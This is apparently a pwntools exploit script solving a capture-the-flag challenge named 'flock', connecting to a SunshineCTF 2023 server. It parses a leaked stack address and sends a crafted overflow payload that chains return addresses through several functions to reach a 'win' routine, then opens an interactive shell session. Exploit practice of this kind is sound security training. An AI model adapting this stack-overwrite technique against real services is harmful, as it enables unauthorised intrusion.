from pwn import *

binary = "flock"

# context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    #return remote('127.0.0.1', 23002)
    return remote('chal.2023.sunshinectf.games', 23002)
    
    # if args.GDB:
    #     return gdb.debug(e.path, gdbscript=gs)
    # elif args.REMOTE:
    #     return remote('127.0.0.1', 23002)
    # else:
    #     return process(e.path)

p = start()

def leak_stack_addr():
   p.recvuntil(b'<<< Song Begins At ')
   addr = int(p.recvline().strip(b'\n'),16)
   log.info('Addr = 0x%x' %addr)
   return addr

def ret_chain(addr):
   chain =  p64(addr+168)*17
   chain += p64(e.sym['func4']+13)
   chain += p64(addr+200)*4
   chain += p64(e.sym['func3']+13)
   chain += p64(addr+232)*3
   chain += p64(e.sym['func2']+13) 
   chain += b'A'*24
   chain += p64(e.sym['func1']+9)
   chain += b'B'*8
   chain += p64(e.sym['win'])
   return chain

addr = leak_stack_addr()
chain = ret_chain(addr)

p.sendline(chain)
p.interactive()
